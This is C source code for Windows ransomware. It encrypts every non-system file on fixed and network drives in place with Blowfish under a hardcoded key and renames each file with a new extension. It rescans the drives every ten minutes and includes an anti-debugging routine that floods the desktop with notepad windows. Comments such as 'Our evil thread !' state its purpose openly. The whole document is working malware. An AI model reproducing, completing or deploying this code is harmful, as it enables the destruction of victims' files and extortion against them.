
/* hehe blowfish encryption :) */
void Encrypt_File(char *filename)
{
    char *in = NULL,*out = NULL;
	HANDLE file_fd = NULL;
	DWORD file_size = 0,written_bytes,read_bytes,cnt = 0,ThreadID = 0,Orig;
	union symmetric_key skey;
	char safer_name[MAX_PATH];
	
	if(blowfish_setup("!&0#]<?^",8,0,&skey) == CRYPT_ERROR)
	{
		  /* Fail to setup blowfish */
		return;
	}

	if((file_fd = CreateFile(filename,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) == INVALID_HANDLE_VALUE)
	{
		 /* Fail to open */
		return;
	}

	file_size = GetFileSize(file_fd,NULL);
	
	if(file_size == 0xFFFFFFFF)
	{
		 /* Fail to get size */
		CloseHandle(file_fd);
		return;
	}

	/* filesize % 8 == 0 */
    if(file_size % 8 != 0) 
	{
	file_size = ((file_size/8)+1)*8;
	}

	/* Ok, allocate memory */
	in = (char *)GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,file_size);
	out = (char *)GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,file_size);
    
	if(in == NULL || out == NULL)
	{
		 /* Fail to allocate memory */
		CloseHandle(file_fd);
		return;
	}

#define FREE_ALL GlobalFree(in); \
	             GlobalFree(out); \
	             CloseHandle(file_fd);
	
	/* Read entire file in buf */
	if(ReadFile(file_fd,in,file_size,&read_bytes,NULL) == 0)
	{
		/* Fail to read */
		FREE_ALL
		return;
	}
	
	/* Write encrypted version */
	SetFilePointer(file_fd,0,0,FILE_BEGIN);
	
	 /* Encrypt ! */
	  for(cnt = 0;cnt < file_size;cnt+=8)
	  {
	blowfish_ecb_encrypt(in+cnt,out+cnt,&skey);
	  }

	if(WriteFile(file_fd,out,file_size,&written_bytes,NULL) == 0)
	{
		/* Fail to write */
		FREE_ALL
		return;
	}
	
	/* Free */
	FREE_ALL

	/* Rename */
	strcpy(safer_name,filename);
	strcat(safer_name,saferED_EXT);
	MoveFile(filename,safer_name);

	/* Increment :) */
	Enc_Files++;

	 /* MsG for user */
	if(Enc_Files > 150)
	{
		 /* so the encryption goes on */
		CreateThread(NULL,0,&MsgToUser,0,0,&ThreadID);
		Enc_Files = 0;
	}
}

/* This is the function used to scan drives for files */
void S3arch(char *pt) {
	 char sc[MAX_PATH],buf[MAX_PATH];
	 WIN32_FIND_DATA in;
	 HANDLE fd,file;
	 char *fm = "%s\\%s",*fm1 = "%s\\*.*";

	 if(strlen(pt) == 3) 
	 {
		pt[2] = '\0'; /* :-) */
	 }
	 
	 sprintf(sc,fm1,pt);
     fd = FindFirstFile(sc,&in);
 
 do
 {
	
	 sprintf(buf,fm,pt,in.cFileName);

	   /* dot :) */
	 if(strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0 && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) 
	 {
		 S3arch(buf);
	 }
	 
	   /* File found */
	 else 
	 {
		 
		 /* is it good to encrypt ? */

		 if(!strstr(in.cFileName,saferED_EXT) && !strstr(in.cFileName,".dll") 
			 && !strstr(in.cFileName,".exe") && !strstr(in.cFileName,".ini") &&
			     !strstr(in.cFileName,".vxd") && !strstr(in.cFileName,".drv") &&
				 strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0)
		 {
			 Encrypt_File(buf);
		 }
	 }
	 
 }while(FindNextFile(fd,&in));
 
 FindClose(fd);
}

/* Antidebugging routine */
DWORD WINAPI AntiDebug(LPVOID Data)
{
 /* Get IsDebuggerPresent() API */
	HANDLE Lib = LoadLibrary("kernel32.dll");
	FARPROC DbG = GetProcAddress(Lib,"IsDebuggerPresent");

	if(DbG == NULL)
	{
		 /* No API */
		return;
	}
	
	for(;;)
	{
		  /* Check if debugged */
        if((*DbG)())
		{
		       /* MsG to debugger */	
			OutputDebugString("do you want to kill me?");
			
			 /* :) */
			while(1)
			{
				WinExec("notepad.exe",SW_SHOW);
			}
		}
		
		 /* 2 seconds */
		Sleep(2000);
	}
}

/* Our evil thread ! */
DWORD WINAPI R4ns0m(LPVOID Data)
{
	    char Drives[3],Drive = 0;
		UINT drive_type;

	while(1)
	{
	
		  /* Search for drives */
		for(Drive = 'C';Drive <= 'Z';Drive++)
		{
		Drives[0] = Drive;
		Drives[1] = ':';
		Drives[2] = '\\';
		Drives[3] = '\0';

		/* drive ? */
		drive_type = GetDriveType(Drives);
		      
		          /* only fixed and remote drives */
		       if(drive_type == DRIVE_FIXED || drive_type == DRIVE_REMOTE)
			   {
				     /* GO! */
				   S3arch(Drives);
			   }
		}

		/* every 10 minutes */
		Sleep((1000*60)*10);
	}
}